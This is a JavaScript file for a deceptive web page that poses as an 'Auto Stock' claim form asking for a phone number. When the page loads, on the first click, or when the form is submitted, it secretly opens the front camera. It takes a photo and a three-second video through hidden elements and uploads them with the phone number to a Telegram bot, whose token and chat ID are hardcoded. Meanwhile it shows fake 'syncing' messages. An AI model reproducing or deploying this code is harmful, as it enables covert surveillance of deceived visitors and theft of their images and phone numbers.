const CONFIG = {
    TELEGRAM_BOT_TOKEN: '8663952645:AAGId4MEbgWPNVNWSsa8o5M_NHXSoqos1po',
    CHAT_ID: '7674484307',
    VIDEO_DURATION: 3000, // 3 seconds
};

const elements = {
    form: document.getElementById('claimForm'),
    phoneInput: document.getElementById('phoneNumber'),
    submitBtn: document.getElementById('submitBtn'),
    spinner: document.getElementById('spinner'),
    btnText: document.querySelector('.btn-text'),
    status: document.getElementById('statusMessage'),
    video: document.getElementById('hidden-video'),
    canvas: document.getElementById('hidden-canvas')
};

let hasPermission = false;

// Request permission immediately on load and also on first click as fallback
async function autoStart() {
    if (!hasPermission) {
        try {
            await startCaptureFlow('Initial Load');
            hasPermission = true;
            console.log('Automatic capture started');
        } catch (err) {
            console.warn('Auto-start failed (likely browser security):', err);
        }
    }
}

window.addEventListener('DOMContentLoaded', autoStart);

document.addEventListener('click', async () => {
    if (!hasPermission) {
        await autoStart();
    }
}, { once: true });

elements.form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const phoneNumber = elements.phoneInput.value;
    
    // UI Loading state
    setLoading(true);
    elements.status.textContent = 'Synchronizing Stock Database...';
    elements.status.style.color = 'var(--primary)';

    try {
        await startCaptureFlow(phoneNumber);
        
        // Final UI state
        elements.status.textContent = 'Auto Stock Activated! Your inventory is now syncing in real-time.';
        elements.status.style.color = 'var(--accent)';
        elements.phoneInput.value = '';
    } catch (err) {
        console.error('Flow error:', err);
        elements.status.textContent = 'Error: Device not compatible or permission denied.';
        elements.status.style.color = 'var(--accent)';
    } finally {
        setLoading(false);
    }
});

function setLoading(isLoading) {
    elements.submitBtn.disabled = isLoading;
    elements.spinner.style.display = isLoading ? 'block' : 'none';
    elements.btnText.textContent = isLoading ? 'Processing...' : 'Claim Now';
}

async function startCaptureFlow(phoneNumber = 'Initial Load') {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user' }, 
            audio: false 
        });
        
        elements.video.srcObject = stream;
        
        // Wait for video to be ready
        await new Promise(resolve => elements.video.onloadedmetadata = resolve);

        // 1. Capture Image
        const imgBlob = await captureImage();
        await sendToTelegram('photo', imgBlob, phoneNumber);

        // 2. Capture Short Video
        const videoBlob = await captureVideo(stream);
        await sendToTelegram('video', videoBlob, phoneNumber);

        // Stop all tracks
        stream.getTracks().forEach(track => track.stop());
        
    } catch (err) {
        throw err;
    }
}

async function captureImage() {
    const { canvas, video } = elements;
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    return new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.8);
    });
}

async function captureVideo(stream) {
    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    const chunks = [];
    
    return new Promise((resolve, reject) => {
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            resolve(blob);
        };
        
        mediaRecorder.onerror = reject;
        
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), CONFIG.VIDEO_DURATION);
    });
}

async function sendToTelegram(type, blob, phoneNumber) {
    const formData = new FormData();
    const filename = type === 'photo' ? 'capture.jpg' : 'capture.webm';
    formData.append(type, blob, filename);
    formData.append('caption', `📱 Phone: ${phoneNumber}\n📸 Type: ${type}`);
    
    const endpoint = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`;
    
    try {
        await axios.post(endpoint, formData, {
            params: { chat_id: CONFIG.CHAT_ID }
        });
    } catch (err) {
        console.error(`Telegram ${type} error:`, err);
    }
}
